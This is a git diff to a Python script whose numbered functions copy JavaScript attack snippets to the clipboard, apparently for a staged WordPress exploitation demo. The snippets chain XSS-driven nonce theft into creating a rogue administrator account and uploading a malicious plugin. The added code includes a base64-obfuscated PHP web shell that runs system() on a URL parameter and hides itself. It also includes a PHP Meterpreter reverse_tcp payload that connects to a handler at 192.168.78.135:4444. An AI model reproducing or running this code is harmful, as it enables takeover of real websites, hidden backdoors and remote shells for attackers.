@@ -52,6 +52,9 @@ function helloWorld()
 
 
 
+
+
+
 # First version of add user, missing the nonce
 def two():
 	code = """
@@ -61,7 +64,7 @@ function addAdminUser()
 
 	// The following user will be added as an Administrator level user
 	var username  = "sleevelessCyberBandits";
-	var email     = "advancedadmin%40bad.af"
+	var email     = "tester@tester.com"
 	var firstName = "trevor";
 	var lastName  = "roach";
 	var password  = "toor";
@@ -99,6 +102,10 @@ function addAdminUser()
 
 
 
+
+
+
+
 # Code to find "add user" nonce
 def three():
 	code = """
@@ -128,7 +135,7 @@ function read_body(xhr)
 
 
 // Parse out the nonce value then pass to the add user function
-function addAdminUser()
+function findNonce()
 {
 	var uri = "/wp-admin/user-new.php";
 
@@ -159,6 +166,10 @@ function addAdminUser()
 
 
 
+
+
+
+
 # Woohoo! Working admin user!
 def four():
 	code = """
@@ -169,7 +180,7 @@ function addAdminUser()
 
 	// The following user will be added as an Administrator level user
 	var username  = "sleevelessCyberBandits";
-	var email     = "advancedadmin%40bad.af"
+	var email     = "tester@tester.com"
 	var firstName = "trevor";
 	var lastName  = "roach";
 	var password  = "toor";
@@ -222,7 +233,11 @@ function addAdminUser()
 
 	copyToClipboard(code)
 
-	return "Happy Add Admin User v2 yummyness ready..."
+	return "Final form add admin user func ready..."
+
+
+
+
 
 
 
@@ -230,16 +245,10 @@ function addAdminUser()
 # Find the plugin nonce, nothing else yet
 def five():
 	code = """
-// Get the nonce required for adding a new plugin
-// and upload the malicious plugin. Then you can use
-// the yertle.py script to execute actions such
-// as starting a reverse shell, or popping a php
-// meterpreter shell
 function installYertleShell()
 {
 	console.log("Starting add plugin, hunting for the nonce...");
 
-		// console.log("Starting getNonce...");
 	var uri = "/wp-admin/plugin-install.php";
 
 	xhr = new XMLHttpRequest();
@@ -269,8 +278,15 @@ function installYertleShell()
 
 
 
+
+
+
+
+
 # Phewww this is a lot. And it's missing the actual binary
-# and parsing of installation directory
+# and parsing of installation directory. Note the extra 
+# escapes needed below for this to come through 
+# correctly
 def six():
 	code = """
 var webShellPath    = "shell/shell.php";
@@ -305,7 +321,7 @@ function installYertleShell()
 
 			// This data buffer should be your 
 			// PHP plugin zip file. 
-			var pluginZipFile = '\x41\x42\x43';
+			var pluginZipFile = '\\x41\\x42\\x43';
 
 
 			var fileSize = pluginZipFile.length;
@@ -321,24 +337,24 @@ function installYertleShell()
 			uploadXhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 			uploadXhr.setRequestHeader("Upgrade-Insecure-Requests", "1");
 
-			var body = "--" + boundary + "\r\n";
-			body += 'Content-Disposition: form-data; name="_wpnonce"' + '\r\n\r\n';
-			body += nonceVal + "\r\n"; 
+			var body = "--" + boundary + "\\r\\n";
+			body += 'Content-Disposition: form-data; name="_wpnonce"' + '\\r\\n\\r\\n';
+			body += nonceVal + "\\r\\n"; 
 
-			body += "--" + boundary + "\r\n";
-			body += 'Content-Disposition: form-data; name="_wp_http_referer"' + "\r\n\r\n";
-			body += "/wp-admin/plugin-install.php" + "\r\n";
+			body += "--" + boundary + "\\r\\n";
+			body += 'Content-Disposition: form-data; name="_wp_http_referer"' + "\\r\\n\\r\\n";
+			body += "/wp-admin/plugin-install.php" + "\\r\\n";
 
 
-			body += "--" + boundary + "\r\n";
-			body += 'Content-Disposition: form-data; name="pluginzip"; filename="shell.zip"' + "\r\n";
-			body += "Content-Type: application/zip" + "\r\n\r\n";
-			body += pluginZipFile + "\r\n";
+			body += "--" + boundary + "\\r\\n";
+			body += 'Content-Disposition: form-data; name="pluginzip"; filename="shell.zip"' + "\\r\\n";
+			body += "Content-Type: application/zip" + "\\r\\n\\r\\n";
+			body += pluginZipFile + "\\r\\n";
 
-			body += "--" + boundary + "\r\n";
-			body += 'Content-Disposition: form-data; name="install-plugin-submit"' + "\r\n\r\n";
-			body += "Install Now" + "\r\n";
-			body += boundary + "--\r\n\r\n";
+			body += "--" + boundary + "\\r\\n";
+			body += 'Content-Disposition: form-data; name="install-plugin-submit"' + "\\r\\n\\r\\n";
+			body += "Install Now" + "\\r\\n";
+			body += boundary + "--\\r\\n\\r\\n";
 
 			var aBody = new Uint8Array(body.length);
 			for (var i = 0; i < aBody.length; i++)
@@ -361,7 +377,268 @@ function installYertleShell()
 
 
 
+
+
+def seven():
+	code = """
+			// We need to know path to our shell, so we need to know where
+			// WordPress installed it. Let's parse the path
+			// out from the response since this isn't always
+			// what we expect...
+			uploadXhr.onreadystatechange = function()
+			{
+				if (uploadXhr.readyState == XMLHttpRequest.DONE)
+				{
+					var response   = read_body(uploadXhr);
+					var startIndex = response.indexOf('<p>Plugin installed successfully.</p>');
+					var endIndex   = response.indexOf('target="_parent">Activate Plugin</a>');
+					var pluginPath = response.substring(startIndex + 119, endIndex-26);
+	
+					pluginPath = pluginPath.replace("%2F", "/");
+					window.webShellPath = pluginPath;
+	
+					// Pull the directory name out so we can
+					// set the meterpreter directory
+					var pluginDir = pluginPath.split("/");
+					window.phpMetShellPath = pluginDir[0] + "/meterpreter.php";
+				}
+			} 
+	"""
+
+	copyToClipboard(code)
+
+	return "Plugin Install Path Parser snippet ready..."
+
+
+
+
+
+
+
+# Extra escaping needed below
+def eight():
+	code = """
+const sleep = (milliseconds) => 
+{
+	return new Promise(resolve => setTimeout(resolve, milliseconds))
+}
+
+
+
+
+async function hideYertleShell()
+{
+	// Make sure there isn't an extra carriage return
+	// at the end of the file here
+	var payload =`<?php
+    $command = $_GET["cmd"];
+    $command = substr($command, 0, -1);
+    $command = base64_decode($command);
+
+    if (class_exists('ReflectionFunction')) {
+       $function = new ReflectionFunction('system');
+       $thingy = $function->invoke($command );
+
+    } elseif (function_exists('call_user_func_array')) {
+       call_user_func_array('system', array($command));
+
+    } elseif (function_exists('call_user_func')) {
+       call_user_func('system', $command);
+
+    } else {
+       system($command);
+    }
+
+    ?>`;
+
+	var encodedPayload = btoa(payload);
+
+	var cmd = "php -r \'echo base64_decode(\"" + encodedPayload + "\");\' > shell.php\\n";
+	var encodedCmd = btoa(cmd);
+
+
+	// Before we sent this, we first  need to make sure the wordpress
+	// server has finished installing the yertle plugin
+	// since this function needs the shell in order
+	// to overwrite itself
+	while (true)
+	{
+		// this might get updated if the wordpress server
+		// ends up installing this someplace we didnt'
+		// expect. It's global, so if another async function
+		// updates it to the correct path, this should get
+		// updated and fall through correctly
+		var testUri = "/wp-content/plugins/" + webShellPath;
+
+		var xhr = new XMLHttpRequest();
+		xhr.open('GET', testUri, false);  
+		xhr.send(null);
+
+		if (xhr.status == 200) 
+		{
+  			//console.log("!! Our shell is ready!");
+  			break;
+		}
+		if (xhr.status == 404)
+		{
+			console.log("Shell isn't there yet...");
+			await sleep(5000);
+			continue;
+		}
+	}
+
+	var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + encodedCmd;
+
+	console.log("About to overwrite the shell.php to hide it in the UI...");
+	xhr = new XMLHttpRequest();
+	
+	xhr.open("GET", uri, true);
+	xhr.send(null);
+}
+	"""
+
+	copyToClipboard(code)
+
+	return "Hide 'n seek time..."
+
+
+
+
+
+# Extra escaping needed below
+def nine():
+	code = """
+// Set your handler's IP and port below.
+async function openPhpMeterpreterSession()
+{
+	// This is the listening IP and port 
+	// for the meterpreter handler. 
+	// This is the php/meterpreter/reverse_tcp 
+	// payload for the handler
+	var handlerIP   = "192.168.78.135";
+	var handlerPort = "4444";
+
+	var metPhpCommand = `<?php
+    error_reporting(0);
+    $ip   = '` + handlerIP + "';";
+
+    metPhpCommand += "$port = "+ handlerPort + ";";
+
+   	metPhpCommand += `
+   	if (($f = 'stream_socket_client') && is_callable($f)) {
+        $s      = $f("tcp://{$ip}:{$port}");
+        $s_type = 'stream';
+    } elseif (($f = 'fsockopen') && is_callable($f)) {
+        $s      = $f($ip, $port);
+        $s_type = 'stream';
+    } elseif (($f = 'socket_create') && is_callable($f)) {
+        $s   = $f(AF_INET, SOCK_STREAM, SOL_TCP);
+        $res = @socket_connect($s, $ip, $port);
+        if (!$res) {
+            die();
+        }
+        $s_type = 'socket';
+    } else {
+        die('no socket funcs');
+    }
+    if (!$s) {
+        die('no socket');
+    }
+    switch ($s_type) {
+        case 'stream':
+            $len = fread($s, 4);
+            break;
+        case 'socket':
+            $len = socket_read($s, 4);
+            break;
+    }
+    if (!$len) {
+        die();
+    }
+    $a   = unpack("Nlen", $len);
+    $len = $a['len'];
+    $b   = '';
+    while (strlen($b) < $len) {
+        switch ($s_type) {
+            case 'stream':
+                $b .= fread($s, $len - strlen($b));
+                break;
+            case 'socket':
+                $b .= socket_read($s, $len - strlen($b));
+                break;
+        }
+    }
+    $GLOBALS['msgsock']      = $s;
+    $GLOBALS['msgsock_type'] = $s_type;
+    eval($b);
+    die();
+    ?>`;
+
+    var payload = btoa(metPhpCommand);
+    var commandValue = "php -r \'echo base64_decode(\"" + payload + "\");\' > meterpreter.php\\n";
+    var encodedCommand = btoa(commandValue);
+
+
+    // We can't use the uploaded shell to write the meterpretery shell
+    // until it's fully installed, check to make sure it's there...
+    while (true)
+	{
+		var testUri = "/wp-content/plugins/" + webShellPath;
+		var xhr = new XMLHttpRequest();
+		xhr.open('GET', testUri, false);  
+		xhr.send(null);
+
+		if (xhr.status == 200) 
+		{
+  			//console.log("!! Our shell is ready!");
+  			break;
+		}
+		if (xhr.status == 404)
+		{
+			//console.log("Shell is still 404'ing...");
+			await sleep(5000);
+			continue;
+		}
+	}
+
+    // Ok, let's upload our meterpreter php file...
+	var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + encodedCommand;
+    xhr = new XMLHttpRequest();
+	
+	xhr.open("GET", uri, true);
+	xhr.send(null);
+
+	console.log("PHP Meterpreter shell uploaded...");
+
+	// 10 seconds should be more than
+	// enough for the meterpreter shell to
+	// be there
+	await sleep(10000);
+
+	console.log ("Sending command to execute shell...");
+    commandValue = "php meterpreter.php";
+    payload = btoa(commandValue);
+
+    var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + payload;
+
+    xhr.open("GET", uri, true);
+	xhr.send(null);
+
+	 // insert shell happy dance here
+}
+	"""
+
+	copyToClipboard(code)
+
+	return "Turtles?"
+
+
+
+
+
+
 def gimmeOuttaHere():
+	print "Later folks :wave:"
 	exit()
 	
 
@@ -377,6 +654,9 @@ def handleInput(input):
         4: four,
         5: five,
         6: six,
+        7: seven,
+        8: eight,
+        9: nine,
         exit: gimmeOuttaHere,
         quit: gimmeOuttaHere
 	}
